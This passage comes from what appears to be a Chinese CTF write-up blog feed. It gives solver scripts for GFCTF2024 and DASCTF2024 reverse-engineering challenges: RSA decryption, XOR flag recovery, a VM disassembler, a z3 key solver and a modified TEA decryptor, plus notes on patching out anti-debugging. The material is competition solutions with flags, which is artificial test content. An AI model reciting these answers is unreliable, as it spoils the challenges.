class="hljs-number">55062197317446999463174096263876498316593115551165463378239159905809676640454208209918217385995561457672251651152473557992138742135601815169185076218362135899344751677854110957095631491941800392408438811446405332089775007801060526398896827361974179433880944797942088556569121442758603066960469154848058525555919633585074687002653178371734389317920858433073228324119903275748010661381766238387457768079481851583182446632335485869275973875534654769410510717692168386489418039967948185844825093846853624216235947670855966394462382073931422900372413115651622846475697848013017412006570314438593706146398436291246626158990758006393615755523796444561949003170112244508437710660501492796759763772367048031312446027160494843576151592257914618405347047042441934740949960412334441</span><br>real_q= <span class="hljs-number">45155472176560032394858410670734933043941707240560969397865820853107208563396632699891831616425752109128199454680206954866754585433276759685964959793491769</span><br>c= <span class="hljs-number">29523353286662420447288429739820034783180593797609319451802397100630230980492429018460170953928563500202582346942199142197785013588760361998950680313834852877108490792872966526015601050884302042018430083206594510237759312983601611859463798190030017950871533501858080631812335748118077560727632343411246129300608114305005550505334558174100631528820258311294104339625598892394650057151595693208992748213949675232397315855876112627150056755058037371576593415880216272977089381300018893299243081150404742921857440064511032025713772327330252031889227225225823090259315491541462395033093742723528280894218885823268632726414223235862198062147879817814619506196476372010238569022037192794906574876350397747710442236263832960264742898816690984736558117232240584876068441918457179310704845718452829124188403042383896118962087518608022867798693371250897927956711708162621772577123078819978462483151316840145260542738057960771219011604</span><br><br>e = <span class="hljs-number">65537</span><br>phi = real_q-<span class="hljs-number">1</span><br>d = inverse(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, real_q)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>GFCTF2024</title>
    <link href="/2024/08/01/GFCTF2024/"/>
    <url>/2024/08/01/GFCTF2024/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="prese"><a href="#prese" class="headerlink" title="prese"></a>prese</h2><p>D810<img src="/2024/08/01/GFCTF2024/1722319131680-cb74dd2c-aa51-48c7-b807-9a870a1ffd4b.png" class="" title="img"></p><img src="/2024/08/01/GFCTF2024/1722319318318-2f9910f5-2841-41c9-a137-3bc4d2965252.png" class="" title="img"><p>~ ^可能在进行某种操作，先猜一下异或</p><img src="/2024/08/01/GFCTF2024/1722320429206-4b335de8-b8ef-41db-8438-89f07ef64680.png" class="" title="img"><img src="/2024/08/01/GFCTF2024/1722320298273-93aa726d-4bf3-43be-ae88-625205d611f6.png" class="" title="img"><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">DASCTF&#123;good<span class="hljs-number">_</span>the<span class="hljs-number">_</span>re<span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span>easyhhhh&#125;<br></code></pre></td></tr></table></figure><img src="/2024/08/01/GFCTF2024/1722327916010-a7e7d4c7-5a7b-4e87-949a-2736cf021139.png" class="" title="img"><h2 id="ezVM"><a href="#ezVM" class="headerlink" title="ezVM"></a>ezVM</h2><p>两位十进制数转成一个16进制数</p><img src="/2024/08/01/GFCTF2024/1722321579870-bd4ebca6-20d4-486a-9d41-91d13960a08d.png" class="" title="img"><p>44位flag，加载dll中的check函数</p><img src="/2024/08/01/GFCTF2024/1722321711399-5914079f-d3f9-4c02-8536-eab72508ceeb.png" class="" title="img"><img src="/2024/08/01/GFCTF2024/1722322021548-6bdaf24e-d5b3-4af2-aff0-a818aec3ce99.png" class="" title="img"><img src="/2024/08/01/GFCTF2024/1722322034317-a9ea7252-410e-44e3-bacb-b67b3f074674.png" class="" title="img"><img src="/2024/08/01/GFCTF2024/1722323283602-a40dff41-ead6-4c8e-b67e-ee60c883cecb.png" class="" title="img"><p>只有异或运算，那么可以根据前16位推出key</p><img src="/2024/08/01/GFCTF2024/1722329826670-277a4a1d-0c46-4e63-ba18-1559b52306cf.png" class="" title="img"><img src="/2024/08/01/GFCTF2024/1722330263081-17237543-404f-4234-b772-37fec50d089e.png" class="" title="img"><img src="/2024/08/01/GFCTF2024/1722330256009-39f50cef-4103-4ca8-baf2-eb2408b60453.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">26</span>,<span class="hljs-number">10</span>,<span class="hljs-number">29</span>,<span class="hljs-number">15</span>]<br>s1=<span class="hljs-string">&#x27;2x*&#123;*&#123;|&#125;qdz,&#123;&#125;d(&#125;q,dxx&#125;zd(z&#125;p&#x27;</span><br>s2=<span class="hljs-string">&#x27;(z+~&#125;yy4&#x27;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    flag+=<span class="hljs-built_in">chr</span>(a[i]^<span class="hljs-number">0x49</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s1)):<br>    flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s1[i])^<span class="hljs-number">0x49</span>)<br>flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x7f</span>^<span class="hljs-number">0x49</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s2)):<br>    flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s2[i])^<span class="hljs-number">0x49</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(flag))<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#DASCTF&#123;1c2c2548-3e24-a48e-1143-a3496a3b7400&#125;</span><br></code></pre></td></tr></table></figure><p>当然，正常思路是vm,op+两个参数</p><img src="/2024/08/01/GFCTF2024/1722332794076-d4cff4a3-489f-4fb2-8a27-20f1a2befdb2.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python">vm = [<span class="hljs-number">0x000000A2</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000084</span>, <span class="hljs-number">0x000000A3</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x000000A3</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000001</span>,<br>      <span class="hljs-number">0x000000B0</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x0000013C</span>, <span class="hljs-number">0x000000B2</span>, <span class="hljs-number">0x000000A3</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x000000A3</span>, <span class="hljs-number">0x00000009</span>,<br>      <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x000000A3</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x000000B0</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x0000009E</span>, <span class="hljs-number">0x000000B2</span>, <span class="hljs-number">0x000000A6</span>,<br>      <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000016</span>, <span class="hljs-number">0x000000A3</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x000000B0</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000379</span>, <span class="hljs-number">0x000000B2</span>,<br>      <span class="hljs-number">0x000000A4</span>, <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0x000000A1</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x000000A3</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000006</span>,<br>      <span class="hljs-number">0x000000B0</span>,<br>      <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000026</span>, <span class="hljs-number">0x000000B2</span>, <span class="hljs-number">0x000000A3</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x000000B0</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000060</span>,<br>      <span class="hljs-number">0x000000B2</span>, <span class="hljs-number">0x000000A1</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x000000A3</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x000000A5</span>, <span class="hljs-number">0x00000009</span>,<br>      <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x000000B0</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x0000006F</span>, <span class="hljs-number">0x000000B2</span>, <span class="hljs-number">0x000000A6</span>, <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x000000A1</span>,<br>      <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x000000A5</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x000000A3</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x000000B0</span>,<br>      <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x0000035B</span>, <span class="hljs-number">0x000000B2</span>, <span class="hljs-number">0x000000A3</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x000000B0</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x000002C2</span>,<br>      <span class="hljs-number">0x000000B2</span>, <span class="hljs-number">0x000000C0</span>]<br><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> vm[i] != <span class="hljs-number">192</span>:<br>    op = vm[i]<br>    <span class="hljs-keyword">if</span> op &lt; <span class="hljs-number">178</span>:<br>        arg1 = vm[i + <span class="hljs-number">1</span>]<br>        arg2 = vm[i + <span class="hljs-number">2</span>]<br>    <span class="hljs-keyword">if</span> op == <span class="hljs-number">160</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mov key[&quot;</span> + <span class="hljs-built_in">str</span>(arg1) + <span class="hljs-string">&quot;] ,&quot;</span> + <span class="hljs-built_in">str</span>(arg2))<br>    <span class="hljs-keyword">if</span> op == <span class="hljs-number">161</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mov key[&quot;</span> + <span class="hljs-built_in">str</span>(arg1) + <span class="hljs-string">&quot;] ,key[&quot;</span> + <span class="hljs-built_in">str</span>(arg2) + <span class="hljs-string">&quot;]&quot;</span>)<br>    <span class="hljs-keyword">if</span> op == <span class="hljs-number">162</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;add key[&quot;</span> + <span class="hljs-built_in">str</span>(arg1) + <span class="hljs-string">&quot;] ,&quot;</span> + <span class="hljs-built_in">str</span>(arg2))<br>    <span class="hljs-keyword">if</span> op == <span class="hljs-number">163</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;add key[&quot;</span> + <span class="hljs-built_in">str</span>(arg1) + <span class="hljs-string">&quot;] ,key[&quot;</span> + <span class="hljs-built_in">str</span>(arg2) + <span class="hljs-string">&quot;]&quot;</span>)<br>    <span class="hljs-keyword">if</span> op == <span class="hljs-number">164</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sub key[&quot;</span> + <span class="hljs-built_in">str</span>(arg1) + <span class="hljs-string">&quot;] ,&quot;</span> + <span class="hljs-built_in">str</span>(arg2))<br>    <span class="hljs-keyword">if</span> op == <span class="hljs-number">165</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sub key[&quot;</span> + <span class="hljs-built_in">str</span>(arg1) + <span class="hljs-string">&quot;] ,key[&quot;</span> + <span class="hljs-built_in">str</span>(arg2) + <span class="hljs-string">&quot;]&quot;</span>)<br>    <span class="hljs-keyword">if</span> op == <span class="hljs-number">166</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mul key[&quot;</span> + <span class="hljs-built_in">str</span>(arg1) + <span class="hljs-string">&quot;] ,&quot;</span> + <span class="hljs-built_in">str</span>(arg2))<br>    <span class="hljs-keyword">if</span> op == <span class="hljs-number">167</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mul key[&quot;</span> + <span class="hljs-built_in">str</span>(arg1) + <span class="hljs-string">&quot;] ,key[&quot;</span> + <span class="hljs-built_in">str</span>(arg2) + <span class="hljs-string">&quot;]&quot;</span>)<br>    <span class="hljs-keyword">if</span> op == <span class="hljs-number">176</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;cmp key[&quot;</span> + <span class="hljs-built_in">str</span>(arg1) + <span class="hljs-string">&quot;] ,&quot;</span> + <span class="hljs-built_in">str</span>(arg2))<br>    <span class="hljs-keyword">if</span> op == <span class="hljs-number">177</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;cmp key[&quot;</span> + <span class="hljs-built_in">str</span>(arg1) + <span class="hljs-string">&quot;] , key[&quot;</span> + <span class="hljs-built_in">str</span>(arg2) + <span class="hljs-string">&quot;]&quot;</span>)<br>    <span class="hljs-keyword">if</span> op == <span class="hljs-number">178</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;jz out&quot;</span>)<br>        i += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">continue</span><br>    i += <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><img src="/2024/08/01/GFCTF2024/1722333271676-199be5a4-0b82-4018-ac48-474698580fb5.png" class="" title="img"><p>用z3得到key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#求解key</span><br>k = [Int(<span class="hljs-string">&quot;%d&quot;</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>)]<br>constraints = []<br>constraints.append(k[<span class="hljs-number">0</span>]+k[<span class="hljs-number">1</span>]+<span class="hljs-number">132</span>==<span class="hljs-number">316</span>)<br>constraints.append(k[<span class="hljs-number">1</span>]+k[<span class="hljs-number">2</span>]+k[<span class="hljs-number">3</span>]==<span class="hljs-number">158</span>)<br>constraints.append(k[<span class="hljs-number">0</span>]+<span class="hljs-number">132</span> + k[<span class="hljs-number">4</span>]*<span class="hljs-number">22</span>==<span class="hljs-number">889</span>)<br>constraints.append(k[<span class="hljs-number">6</span>]+k[<span class="hljs-number">5</span>]-<span class="hljs-number">11</span>==<span class="hljs-number">38</span>)<br>constraints.append(k[<span class="hljs-number">6</span>]+k[<span class="hljs-number">7</span>]==<span class="hljs-number">96</span>)<br>constraints.append(k[<span class="hljs-number">1</span>]+k[<span class="hljs-number">2</span>]-k[<span class="hljs-number">5</span>]+<span class="hljs-number">11</span>==<span class="hljs-number">111</span>)<br>constraints.append(k[<span class="hljs-number">0</span>]+<span class="hljs-number">132</span> + k[<span class="hljs-number">4</span>]*<span class="hljs-number">22</span> - k[<span class="hljs-number">6</span>] + (k[<span class="hljs-number">5</span>]-<span class="hljs-number">11</span>)*<span class="hljs-number">7</span> == <span class="hljs-number">859</span>)<br>constraints.append(k[<span class="hljs-number">3</span>]+k[<span class="hljs-number">4</span>]*<span class="hljs-number">22</span>==<span class="hljs-number">706</span>)<br>solver = Solver()<br>solver.add(constraints)<br><span class="hljs-keyword">if</span> solver.check() == sat:<br>    res = solver.model()<br>    <span class="hljs-built_in">print</span>(solver.model())<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VM</tag>
      
      <tag>seh</tag>
      
      <tag>栈迁移</tag>
      
      <tag>沙箱保护</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF2024暑假挑战赛</title>
    <link href="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="DosSnake"><a href="#DosSnake" class="headerlink" title="DosSnake"></a>DosSnake</h2><p>发现在xor DASCTF</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721446406179-02ee1ae5-7f8e-4017-84ef-1d107cdd762f.png" class="" title="img"><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721445683045-eb77ef5a-a067-4334-8d0b-1b7f133cd0d7.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0x3F</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x37</span>,<br>  <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x24</span>,<br>  <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x3C</span>]<br>key=<span class="hljs-string">&#x27;DASCTF&#x27;</span><br>flag=<span class="hljs-string">&#x27;DASCTF&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    flag+=<span class="hljs-built_in">chr</span>(a[i]^<span class="hljs-built_in">ord</span>(key[i%<span class="hljs-number">6</span>]))<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="Strange-programe"><a href="#Strange-programe" class="headerlink" title="Strange_programe"></a>Strange_programe</h2><p>一般main在code里面</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721447735892-96fdfdeb-055a-4cd0-9f40-9fe2fb31dd1e.png" class="" title="img"><p>根据经验猜测hook了memcmp</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721447716960-2aa15a48-1d22-44d0-8e67-06c973afef15.png" class="" title="img"><p>看到异或感觉有用，交叉引用往上找</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721610573125-cc3b565c-5290-4598-be9c-d520e31e4433.png" class="" title="img"><p>异或生成DASCTF，其实是在解密.DASCTF段</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721453668533-29e41ac2-8684-43e6-81ee-db8efc8ab4fa.png" class="" title="img"><p>nop掉反调试</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721453767391-e2ecad27-a362-4f4f-87b6-c403cd317072.png" class="" title="img"><p>进入1064发现跳到.DASCTF段，处理花指令</p><p>下面在遍历IAT获取memcmp的地址</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721610926637-efc98525-bec9-46c3-8651-230aebcae536.png" class="" title="img"><p>然后就是hook</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721610995965-958252cd-6306-41aa-a44c-8bd4a191b53e.png" class="" title="img"><p>魔改tea</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721454365152-bf252f1e-f321-4d0e-8637-022c2e1544b6.png" class="" title="img"><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721454632349-70fc14c7-5093-46aa-850c-b92a20726dae.png" class="" title="img"><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721454726441-a38c9779-d73c-439a-b940-98a280ff9c33.png" class="" title="img"><p>异或第一位和第二位</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721459036728-9d5570f3-81fe-458b-83cb-4bd08c876ae2.png" class="" title="img"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v, <span class="hljs-type">uint32_t</span> *k)</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], i;<br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x9e3779b9</span>;<br>    <span class="hljs-type">uint32_t</span> sum = delta * <span class="hljs-number">16</span>;<br>    <span class="hljs-type">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++)<br>    &#123;<br>        sum -= delta;<br>        v1 -= ((v0 &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>        v0 -= ((v1 &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k1);<br><br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> enc[<span class="hljs-number">10</span>] = &#123;<br>    <span class="hljs-number">0xBC2B4DF9</span>, <span class="hljs-number">0x6213DD13</span>, <span class="hljs-number">0x89FFFCC9</span>, <span class="hljs-number">0x0FC94F7D</span>, <span class="hljs-number">0x526D1D63</span>, <span class="hljs-number">0xE341FD50</span>, <span class="hljs-number">0x97287633</span>, <span class="hljs-number">0x6BF93638</span>, <br>    <span class="hljs-number">0x83143990</span>, <span class="hljs-number">0x1F2CE22C</span><br>    &#125;;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key[<span class="hljs-number">4</span>] = &#123;<br>    <span class="hljs-number">0x12345678</span>, <span class="hljs-number">0x09101112</span>, <span class="hljs-number">0x13141516</span>, <span class="hljs-number">0x15161718</span><br>    &#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">9</span>; i &gt;= <span class="hljs-number">2</span>; i-=<span class="hljs-number">2</span>)<br>    &#123;<br>        enc[i] ^= enc[<span class="hljs-number">1</span>];<br>        enc[i - <span class="hljs-number">1</span>] ^= enc[<span class="hljs-number">0</span>];<br>        decrypt(enc, key);<br>    &#125;<br>    decrypt(enc, key);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, enc);<br>&#125;<br>DASCTF&#123;I4TH0ok_I5S0ooFunny_Isnotit?????&#125;<br></code></pre></td></tr></table></figure><h2 id="BabyAndroid"><a href="#BabyAndroid" class="headerlink" title="BabyAndroid"></a>BabyAndroid</h2><p>直接搜DAS发现rc4算法</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721479758614-f957e298-f9eb-4a59-9413-5aae48da78ef.png" class="" title="img"><p>loaddata调用jpg</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721479794670-542fdd6e-35f4-4cec-b857-dd25a023a01b.png" class="" title="img"><p>解密得到dex</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721464582687-3788dd1b-dfe7-4a8c-a46d-78cc5d6af9d2.png" class="" title="img"><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721466691572-e39100aa-23ea-4cf6-8656-914f06fde8ce.png" class="" title="img"><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721611216992-1f4f8cd7-2e80-46e0-957e-29d12895a69a.png" class="" title="img"><p>没想到是用0d</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721611229826-1835cb83-98ad-4dbd-95ea-4aa152f7d7c4.png" class="" title="img"><p>脚本解出来一堆数字</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721479424527-b69fdb76-89bf-4b8a-814f-ec465fa81ad0.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 